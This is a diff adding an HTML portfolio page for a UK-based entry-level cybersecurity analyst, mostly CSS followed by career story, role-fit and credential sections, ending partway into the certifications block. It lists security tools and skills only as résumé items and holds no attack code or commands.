@@ -1,0 +1,1918 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Opeyemi Akinlade Entry-level Cybersecurity Analyst portfolio. SOC, Security Analyst & GRC. MSc Cybersecurity, CEH, SC-200. Hands-on penetration testing, digital forensics, and enterprise security consultancy.">
+<title>Opeyemi Akinlade Cybersecurity Portfolio</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Syne:wght@400;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0d12;
+    --bg2: #10151e;
+    --bg3: #161c28;
+    --bg4: #1a2030;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --green: #00c88c;
+    --green2: #00a674;
+    --green-dim: rgba(0,200,140,0.12);
+    --green-glow: rgba(0,200,140,0.06);
+    --blue: #4a9eff;
+    --blue-dim: rgba(74,158,255,0.1);
+    --amber: #f5a623;
+    --amber-dim: rgba(245,166,35,0.1);
+    --red: #ff5555;
+    --red-dim: rgba(255,85,85,0.12);
+    --purple: #b08fff;
+    --purple-dim: rgba(176,143,255,0.1);
+    --text: #e8edf5;
+    --text2: #8b96a8;
+    --text3: #5a6474;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Inter', sans-serif;
+    --display: 'Syne', sans-serif;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 15px;
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+  a { color: var(--green); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  code {
+    font-family: var(--mono);
+    font-size: 0.92em;
+    color: var(--text);
+    background: rgba(255,255,255,0.04);
+    padding: 1px 6px;
+    border-radius: 3px;
+  }
+
+  /* ════════════ HERO ════════════ */
+  .hero {
+    position: relative;
+    padding: 90px 60px 60px;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -100px; right: -100px;
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(0,200,140,0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero::after {
+    content: '';
+    position: absolute;
+    bottom: -200px; left: -100px;
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(74,158,255,0.05) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-inner {
+    position: relative;
+    z-index: 1;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+  .hero-label {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--green);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .hero-label::before {
+    content: '';
+    display: inline-block;
+    width: 28px;
+    height: 1px;
+    background: var(--green);
+  }
+  .hero h1 {
+    font-family: var(--display);
+    font-size: clamp(2.6rem, 6vw, 4.5rem);
+    font-weight: 800;
+    letter-spacing: -0.025em;
+    line-height: 1.05;
+    margin-bottom: 24px;
+    color: #fff;
+  }
+  .hero h1 span.green { color: var(--green); }
+  .hero-roles {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0 18px;
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--text2);
+    margin-bottom: 24px;
+    align-items: center;
+  }
+  .hero-roles strong { color: var(--green); font-weight: 500; }
+  .hero-roles .sep { color: var(--text3); }
+  .hero-sub {
+    font-size: 17px;
+    color: var(--text2);
+    max-width: 660px;
+    line-height: 1.65;
+    margin-bottom: 40px;
+  }
+  .hero-sub strong { color: var(--text); font-weight: 500; }
+  .hero-cta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px;
+    margin-bottom: 36px;
+  }
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 11px 22px;
+    border-radius: 6px;
+    font-family: var(--sans);
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none !important;
+    transition: all 0.2s;
+    border: 1px solid;
+  }
+  .btn-primary {
+    background: var(--green);
+    color: var(--bg) !important;
+    border-color: var(--green);
+  }
+  .btn-primary:hover { background: var(--green2); border-color: var(--green2); }
+  .btn-ghost {
+    background: transparent;
+    color: var(--text) !important;
+    border-color: var(--border2);
+  }
+  .btn-ghost:hover { border-color: var(--green); color: var(--green) !important; }
+  .btn-arrow { font-size: 16px; }
+
+  .hero-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+  .tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 5px 12px;
+    border-radius: 4px;
+    border: 1px solid;
+    letter-spacing: 0.05em;
+  }
+  .tag-green { color: var(--green); border-color: rgba(0,200,140,0.25); background: var(--green-glow); }
+  .tag-blue  { color: var(--blue);  border-color: rgba(74,158,255,0.2);  background: var(--blue-dim); }
+  .tag-amber { color: var(--amber); border-color: rgba(245,166,35,0.2);  background: var(--amber-dim); }
+  .tag-purple{ color: var(--purple);border-color: rgba(176,143,255,0.2); background: var(--purple-dim); }
+
+  /* ════════════ STAT STRIP ════════════ */
+  .stats {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 28px 60px;
+  }
+  .stats-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: 24px;
+  }
+  .stat {
+    text-align: center;
+    border-right: 1px solid var(--border);
+    padding-right: 24px;
+  }
+  .stat:last-child { border-right: none; }
+  .stat-num {
+    font-family: var(--display);
+    font-size: 1.7rem;
+    font-weight: 700;
+    color: var(--green);
+    line-height: 1.1;
+    margin-bottom: 2px;
+  }
+  .stat-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+
+  /* ════════════ NAV ════════════ */
+  .toc {
+    background: rgba(10,13,18,0.85);
+    border-bottom: 1px solid var(--border);
+    padding: 18px 60px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    backdrop-filter: blur(12px);
+  }
+  .toc-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    align-items: center;
+  }
+  .toc-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-right: 8px;
+  }
+  .toc a {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text2);
+    letter-spacing: 0.05em;
+    text-decoration: none;
+    transition: color 0.15s;
+    padding: 6px 0;
+  }
+  .toc a:hover { color: var(--green); text-decoration: none; }
+
+  /* ════════════ SECTIONS ════════════ */
+  .section {
+    padding: 72px 60px;
+    border-bottom: 1px solid var(--border);
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+  .section-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--green);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .section-title {
+    font-family: var(--display);
+    font-size: 1.9rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 8px;
+    line-height: 1.2;
+  }
+  .section-subtitle {
+    color: var(--text3);
+    font-size: 14px;
+    margin-bottom: 36px;
+    max-width: 680px;
+    line-height: 1.6;
+  }
+
+  /* ════════════ STORY ════════════ */
+  .story p {
+    color: var(--text2);
+    font-size: 16px;
+    line-height: 1.8;
+    margin-bottom: 18px;
+    max-width: 800px;
+  }
+  .story p strong { color: var(--text); font-weight: 500; }
+  .story p em { color: var(--green); font-style: normal; font-weight: 500; }
+
+  /* ════════════ ROLE CARDS ════════════ */
+  .role-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+  }
+  .role-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 28px 24px;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+  .role-card:hover {
+    border-color: rgba(0,200,140,0.3);
+    transform: translateY(-2px);
+  }
+  .role-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--green), transparent);
+  }
+  .role-card-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 14px;
+  }
+  .role-icon {
+    width: 32px;
+    height: 32px;
+    background: var(--green-dim);
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--green);
+    font-family: var(--mono);
+    font-weight: 600;
+    font-size: 13px;
+  }
+  .role-title {
+    font-family: var(--display);
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: #fff;
+  }
+  .role-card p {
+    font-size: 13.5px;
+    color: var(--text2);
+    line-height: 1.6;
+    margin-bottom: 14px;
+  }
+  .role-card-fit {
+    border-top: 1px solid var(--border);
+    padding-top: 14px;
+    margin-top: 14px;
+  }
+  .role-card-fit-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--green);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .role-card-fit ul {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+  .role-card-fit li {
+    color: var(--text2);
+    font-size: 12.5px;
+    padding-left: 16px;
+    position: relative;
+    margin-bottom: 5px;
+    line-height: 1.5;
+  }
+  .role-card-fit li::before {
+    content: '▸';
+    color: var(--green);
+    position: absolute;
+    left: 0;
+    top: 0;
+    font-size: 10px;
+  }
+
+  /* ════════════ SKILLS ════════════ */
+  .skills-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+  }
+  .skill-group {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 22px;
+  }
+  .skill-group-title {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    color: var(--green);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .skill-group-title::before {
+    content: '';
+    display: inline-block;
+    width: 6px;
+    height: 6px;
+    background: var(--green);
+    border-radius: 50%;
+  }
+  .skill-list {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 7px;
+  }
+  .skill-list li {
+    font-size: 13px;
+    color: var(--text2);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .skill-list li::before {
+    content: '▸';
+    color: var(--green);
+    font-size: 10px;
+    flex-shrink: 0;
+  }
+
+  /* ════════════ CERT HIGHLIGHT ════════════ */
+  .certs {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 14px;
+  }
+  .cert {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    border-radius: 6px;
+    padding: 20px 22px;
+  }
+  .cert-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 8px;
+  }
+  .cert-badge {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--green);
+    background: var(--green-dim);
+    padding: 3px 8px;
+    border-radius: 3px;
+    letter-spacing: 0.05em;
+  }
+  .cert-issuer {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+  }
+  .cert-title {
+    font-family: var(--display);
+    font-size: 1.05rem;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 6px;
+  }
+  .cert-desc {
+    font-size: 13px;
+    color: var(--text2);
+    line-height: 1.55;
+  }
+
+  /* ════════════ PROJECTS (walkthrough) ════════════ */
+  .project-meta {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 16px;
+    margin-bottom: 16px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+    letter-spacing: 0.05em;
+    align-items: center;
+  }
+  .project-applies {
+    display: inline-flex;
+    gap: 4px;
+    align-items: center;
+  }
+  .project-applies-label {
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-right: 4px;
+  }
+  .role-pill {
+    font-family: var(--mono);
+    font-size: 9.5px;
+    padding: 2px 7px;
+    border-radius: 3px;
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+  }
+  .role-pill-soc  { color: var(--green); background: var(--green-dim); border: 1px solid rgba(0,200,140,0.2); }
+  .role-pill-an   { color: var(--blue); background: var(--blue-dim);  border: 1px solid rgba(74,158,255,0.2); }
+  .role-pill-grc  { color: var(--purple);background: var(--purple-dim);border: 1px solid rgba(176,143,255,0.2); }
+
+  .tool-strip {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin: 14px 0 22px;
+  }
+  .tool {
+    font-family: var(--mono);
+    font-size: 10.5px;
+    padding: 4px 10px;
+    border-radius: 3px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    color: var(--text2);
+  }
+
+  .walk-section { margin-top: 48px; }
+  .walk-num {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--green);
+    background: var(--green-dim);
+    padding: 3px 10px;
+    border-radius: 3px;
+    border: 1px solid rgba(0,200,140,0.2);
+    letter-spacing: 0.1em;
+    margin-bottom: 12px;
+  }
+  .walk-title {
+    font-family: var(--display);
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 18px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 12px;
+  }
+  .walk-section p {
+    color: var(--text2);
+    margin-bottom: 14px;
+  }
+  .walk-section p strong { color: var(--text); font-weight: 500; }
+  .walk-section h4 {
+    font-family: var(--display);
+    font-size: 1.05rem;
+    font-weight: 600;
+    color: #fff;
+    margin: 28px 0 12px;
+  }
+  .walk-section ul {
+    list-style: none;
+    margin: 12px 0 18px;
+  }
+  .walk-section li {
+    color: var(--text2);
+    padding-left: 22px;
+    position: relative;
+    margin-bottom: 8px;
+  }
+  .walk-section li::before {
+    content: '▸';
+    color: var(--green);
+    position: absolute;
+    left: 4px;
+    top: 0;
+    font-size: 11px;
+  }
+
+  .code {
+    background: #0d1219;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    border-radius: 4px;
+    padding: 14px 18px;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: #d4dae5;
+    margin: 12px 0 18px;
+    overflow-x: auto;
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+  .code .cmt { color: var(--text3); }
+  .code .ok  { color: var(--green); }
+  .code .err { color: var(--red); }
+  .code .hl  { color: var(--amber); }
+
+  .callout {
+    padding: 14px 18px;
+    border-radius: 6px;
+    margin: 14px 0 20px;
+    border-left: 3px solid;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+  .callout strong {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 6px;
+  }
+  .callout.scenario   { background: var(--green-glow);  border-color: var(--green);  color: var(--text); }
+  .callout.scenario strong  { color: var(--green); }
+  .callout.found      { background: var(--green-glow);  border-color: var(--green);  color: var(--text); }
+  .callout.found strong     { color: var(--green); }
+  .callout.warn       { background: rgba(245,166,35,0.08); border-color: var(--amber); color: var(--text2); }
+  .callout.warn strong      { color: var(--amber); }
+  .callout.critical   { background: var(--red-dim);    border-color: var(--red);   color: var(--text); }
+  .callout.critical strong  { color: var(--red); }
+  .callout.lesson     { background: var(--green-glow); border-color: var(--green); color: var(--text2); }
+  .callout.lesson strong    { color: var(--green); }
+
+  .ioc {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+    margin: 18px 0;
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  .ioc th {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: #fff;
+    background: var(--bg4);
+    padding: 11px 14px;
+    text-align: left;
+    border-bottom: 1px solid var(--border2);
+  }
+  .ioc td {
+    padding: 10px 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    color: var(--text2);
+    vertical-align: middle;
+  }
+  .ioc tr:last-child td { border-bottom: none; }
+  .ioc tr:nth-child(even) { background: rgba(255,255,255,0.015); }
+  .cve-id {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text);
+    white-space: nowrap;
+  }
+  .sev {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 3px;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+    white-space: nowrap;
+  }
+  .sev-c { background: rgba(255,85,85,0.15);   color: #ff7070; border: 1px solid rgba(255,85,85,0.25); }
+  .sev-h { background: rgba(245,166,35,0.12); color: var(--amber); border: 1px solid rgba(245,166,35,0.25); }
+  .sev-m { background: rgba(74,158,255,0.1);  color: var(--blue);  border: 1px solid rgba(74,158,255,0.2); }
+  .cvss-c { color: #ff7070; font-family: var(--mono); font-weight: 600; }
+  .cvss-h { color: var(--amber); font-family: var(--mono); font-weight: 600; }
+  .cvss-m { color: var(--blue); font-family: var(--mono); font-weight: 600; }
+
+  .timeline-list { margin: 18px 0; border-left: 2px solid var(--border); padding-left: 0; }
+  .timeline-item {
+    display: grid;
+    grid-template-columns: 200px 1fr;
+    gap: 16px;
+    padding: 8px 0 8px 18px;
+    margin-left: -1px;
+    border-left: 2px solid transparent;
+  }
+  .timeline-item:hover { border-left-color: var(--green); }
+  .timeline-time {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--green);
+    font-weight: 500;
+  }
+  .timeline-event { font-size: 14px; color: var(--text2); }
+
+  .kv {
+    display: grid;
+    grid-template-columns: 200px 1fr;
+    gap: 8px 18px;
+    margin: 16px 0 20px;
+    font-size: 13px;
+  }
+  .kv dt {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+    letter-spacing: 0.05em;
+    text-transform: uppercase;
+    padding-top: 2px;
+  }
+  .kv dd { color: var(--text2); font-family: var(--mono); font-size: 12px; word-break: break-all; }
+
+  /* ════════════ EXPERIENCE TIMELINE ════════════ */
+  .xp-list { margin-top: 12px; }
+  .xp-item {
+    display: grid;
+    grid-template-columns: 160px 1fr;
+    gap: 24px;
+    padding: 24px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .xp-item:last-child { border-bottom: none; }
+  .xp-date {
+    font-family: var(--mono);
+    font-size: 11.5px;
+    color: var(--green);
+    letter-spacing: 0.05em;
+    padding-top: 4px;
+  }
+  .xp-content { }
+  .xp-role {
+    font-family: var(--display);
+    font-size: 1.15rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 2px;
+  }
+  .xp-org {
+    font-size: 14px;
+    color: var(--green);
+    margin-bottom: 14px;
+  }
+  .xp-content ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+  }
+  .xp-content li {
+    color: var(--text2);
+    font-size: 13.5px;
+    padding-left: 18px;
+    position: relative;
+    margin-bottom: 7px;
+    line-height: 1.65;
+  }
+  .xp-content li::before {
+    content: '▸';
+    color: var(--green);
+    position: absolute;
+    left: 0;
+    top: 0;
+    font-size: 11px;
+  }
+  .xp-content li strong { color: var(--text); font-weight: 600; }
+
+  /* ════════════ WHAT I BRING ════════════ */
+  .bring-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+  }
+  .bring-col {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 24px;
+  }
+  .bring-col h3 {
+    font-family: var(--display);
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 6px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .bring-col .bring-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--green);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+    display: block;
+  }
+  .bring-row {
+    margin-bottom: 16px;
+  }
+  .bring-need {
+    font-size: 12.5px;
+    color: var(--text3);
+    margin-bottom: 4px;
+    font-family: var(--mono);
+    letter-spacing: 0.03em;
+  }
+  .bring-need::before { content: '· '; }
+  .bring-have {
+    font-size: 13.5px;
+    color: var(--text2);
+    line-height: 1.55;
+    padding-left: 8px;
+    border-left: 2px solid var(--green);
+  }
+
+  /* ════════════ CTA ════════════ */
+  .cta-section {
+    background: linear-gradient(135deg, var(--bg2) 0%, var(--bg3) 100%);
+    border: 1px solid rgba(0,200,140,0.15);
+    border-radius: 14px;
+    padding: 48px 44px;
+    margin: 0 auto;
+    text-align: center;
+    max-width: 900px;
+    position: relative;
+    overflow: hidden;
+  }
+  .cta-section::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 50%;
+    transform: translateX(-50%);
+    width: 200px;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--green), transparent);
+  }
+  .cta-section h2 {
+    font-family: var(--display);
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 12px;
+  }
+  .cta-section p {
+    color: var(--text2);
+    font-size: 15px;
+    margin-bottom: 28px;
+    max-width: 540px;
+    margin-left: auto;
+    margin-right: auto;
+    line-height: 1.6;
+  }
+  .cta-buttons {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 12px;
+  }
+
+  /* ════════════ FOOTER ════════════ */
+  .footer {
+    padding: 40px 60px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    max-width: 1100px;
+    margin: 0 auto;
+    flex-wrap: wrap;
+    gap: 14px;
+  }
+  .footer-left {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text3);
+  }
+  .footer-right {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--green);
+  }
+
+  @media (max-width: 900px) {
+    .stats-inner { grid-template-columns: repeat(3, 1fr); }
+    .stat:nth-child(3) { border-right: none; }
+    .role-grid, .skills-grid, .bring-grid, .certs { grid-template-columns: 1fr; }
+    .xp-item { grid-template-columns: 1fr; gap: 8px; }
+  }
+  @media (max-width: 768px) {
+    .hero, .section, .toc, .footer, .stats { padding-left: 24px; padding-right: 24px; }
+    .stats-inner { grid-template-columns: repeat(2, 1fr); gap: 16px; }
+    .stat { border-right: none; padding-right: 0; }
+    .timeline-item { grid-template-columns: 1fr; gap: 4px; }
+    .kv { grid-template-columns: 1fr; gap: 4px; }
+    .kv dt { padding-top: 8px; }
+    .cta-section { padding: 36px 24px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════════
+     HERO
+═══════════════════════════════════════════════ -->
+<div class="hero">
+  <div class="hero-inner">
+    <div class="hero-label">Opeyemi Akinlade · UK · Available now</div>
+    <h1>Cybersecurity Analyst.<br><span class="green">Ready to defend and investigate.</span></h1>
+    <div class="hero-roles">
+      <span>Open to:</span>
+      <strong>SOC Analyst</strong>
+      <span class="sep">·</span>
+      <strong>Cybersecurity Analyst</strong>
+      <span class="sep">·</span>
+      <strong>GRC Analyst</strong>
+    </div>
+    <p class="hero-sub">MSc Cybersecurity graduate with hands-on experience in <strong>threat detection, penetration testing, digital forensics and enterprise security consultancy</strong>. Currently writing security proposals for healthcare and fintech clients at CyberSync Hub. Certified in <strong>SC-200 (Microsoft Security Operations Analyst)</strong> and <strong>CEH</strong>. This portfolio documents real work as technical walkthroughs with every command, finding and lesson written down.</p>
+    <div class="hero-cta">
+      <a href="#projects" class="btn btn-primary">View Projects <span class="btn-arrow">→</span></a>
+      <a href="#contact" class="btn btn-ghost">Get in Touch</a>
+    </div>
+    <div class="hero-tags">
+      <span class="tag tag-green">SIEM</span>
+      <span class="tag tag-green">EDR</span>
+      <span class="tag tag-blue">Wireshark</span>
+      <span class="tag tag-blue">Suricata IDS</span>
+      <span class="tag tag-amber">FTK Imager</span>
+      <span class="tag tag-amber">XAMN</span>
+      <span class="tag tag-green">Metasploit</span>
+      <span class="tag tag-purple">ZTNA</span>
+      <span class="tag tag-purple">GDPR</span>
+      <span class="tag tag-purple">PCI-DSS</span>
+      <span class="tag tag-blue">NIST</span>
+      <span class="tag tag-green">MITRE ATT&amp;CK</span>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     STAT STRIP
+═══════════════════════════════════════════════ -->
+<div class="stats">
+  <div class="stats-inner">
+    <div class="stat"><div class="stat-num">MSc</div><div class="stat-label">Cybersecurity</div></div>
+    <div class="stat"><div class="stat-num">2</div><div class="stat-label">Certifications</div></div>
+    <div class="stat"><div class="stat-num">5</div><div class="stat-label">Documented Projects</div></div>
+    <div class="stat"><div class="stat-num">4+</div><div class="stat-label">Years IT &amp; Security</div></div>
+    <div class="stat"><div class="stat-num">2</div><div class="stat-label">Enterprise Proposals</div></div>
+    <div class="stat"><div class="stat-num">UK</div><div class="stat-label">Work Authorised</div></div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     NAV
+═══════════════════════════════════════════════ -->
+<div class="toc">
+  <div class="toc-inner">
+    <span class="toc-label">// Jump to</span>
+    <a href="#about">About</a>
+    <a href="#roles">Role Fit</a>
+    <a href="#certs">Certifications</a>
+    <a href="#skills">Skills</a>
+    <a href="#projects">Projects</a>
+    <a href="#experience">Experience</a>
+    <a href="#bring">What I Bring</a>
+    <a href="#contact">Contact</a>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     ABOUT / STORY
+═══════════════════════════════════════════════ -->
+<div class="section" id="about">
+  <div class="section-label">// Who I am</div>
+  <div class="section-title">From IT Support to Cybersecurity Analyst</div>
+  <p class="section-subtitle">A focused career arc, not a side-step.</p>
+
+  <div class="story">
+    <p>I started in IT Support. That gave me a working understanding of how systems break and how users behave. It also taught me that disciplined ticket-handling and clean documentation are the basis of good operations. Most security alerts begin as something that looks ordinary. Recognising the difference is a skill that builds with time.</p>
+
+    <p>From there I joined the <strong>Ministry of Justice</strong> as a Case Administrator. The role taught me what 100% data accuracy under pressure looks like. I learned how to triage 30+ enquiries a day and how to escalate properly when something doesn't add up. That triage discipline maps onto SOC Tier 1 work.</p>
+
+    <p>While working I completed an <strong>MSc in Cybersecurity</strong> at the University of Portsmouth. The programme covered pen testing engagements against Linux and Windows targets, court-admissible digital forensics reports and mobile forensics investigations. Alongside the degree I earned <strong>CEH</strong> and <strong>SC-200 (Microsoft Security Operations Analyst)</strong>. The latter is aligned to SOC tooling and SIEM workflows.</p>
+
+    <p>I'm now contributing at <strong>CyberSync Hub</strong>. I research client environments, identify security gaps and write enterprise-grade proposals. Recent work includes a unified endpoint and data protection solution for a healthcare client and a Zero Trust Network Access architecture for a major African fintech. This has given me working exposure to <em>EDR, DLP, MDM, ZTNA, backup and recovery and the compliance frameworks (PCI-DSS, GDPR, NDPR) that wrap around them</em>.</p>
+
+    <p>The combination of disciplined operations from MOJ, technical depth from the MSc, attacker awareness from CEH, defender knowledge from SC-200 and consultancy exposure from CyberSync Hub is what I'm bringing into my first dedicated cybersecurity role.</p>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     ROLE FIT
+═══════════════════════════════════════════════ -->
+<div class="section" id="roles">
+  <div class="section-label">// Role fit</div>
+  <div class="section-title">Three roles I'm aiming for</div>
+  <p class="section-subtitle">The work in this portfolio maps to three converging career paths. If you're hiring for any of them, here's how my experience translates.</p>
+
+  <div class="role-grid">
+
+    <div class="role-card">
+      <div class="role-card-header">
+        <div class="role-icon">01</div>
+        <div class="role-title">SOC Analyst</div>
+      </div>
+      <p>Frontline threat detection and incident response. Reading alerts, hunting threats, triaging investigations and escalating incidents with clear documentation.</p>
+      <div class="role-card-fit">
+        <div class="role-card-fit-label">What I bring</div>
+        <ul>
+          <li>SC-200 certified (Microsoft SecOps Analyst)</li>
+          <li>Wireshark, Suricata IDS, log analysis</li>
+          <li>Brute-force, port scan &amp; CVE detection</li>
+          <li>Attacker mindset via CEH + lab pen testing</li>
+          <li>Structured triage from MOJ casework</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="role-card">
+      <div class="role-card-header">
+        <div class="role-icon">02</div>
+        <div class="role-title">Cybersecurity Analyst</div>
+      </div>
+      <p>Broader security operations work including vulnerability management, security architecture support, incident investigation and cross-functional risk reduction.</p>
+      <div class="role-card-fit">
+        <div class="role-card-fit-label">What I bring</div>
+        <ul>
+          <li>Hands-on pen test reports (Linux + Windows)</li>
+          <li>Digital forensics (FTK, XAMN, Autopsy)</li>
+          <li>EDR/DLP/MDM/ZTNA solution knowledge</li>
+          <li>CVE / CVSS / CWE classification fluency</li>
+          <li>Strong technical &amp; executive reporting</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="role-card">
+      <div class="role-card-header">
+        <div class="role-icon">03</div>
+        <div class="role-title">GRC Analyst</div>
+      </div>
+      <p>Governance, Risk and Compliance work covering policy support, framework alignment, audit preparation, third-party risk and security awareness programmes.</p>
+      <div class="role-card-fit">
+        <div class="role-card-fit-label">What I bring</div>
+        <ul>
+          <li>Real proposal writing for regulated clients</li>
+          <li>PCI-DSS, GDPR, NDPR working knowledge</li>
+          <li>NIST, OWASP, NCSC &amp; ACPO frameworks</li>
+          <li>Risk-to-business-impact translation</li>
+          <li>100% audit-accurate documentation (MOJ)</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     CERTIFICATIONS
+═══════════════════════════════════════════════ -->
+<div class="section" id="certs">
+  <div class="section-label">// Credentials</div>
+  <div class="section-title">Certifications &amp; Education</div>
+  <p class="section-subtitle">Validated technical depth, not just labels.</p>
+
+  <div class="certs">
+    <div class="cert">
+      <div class="cert-header">
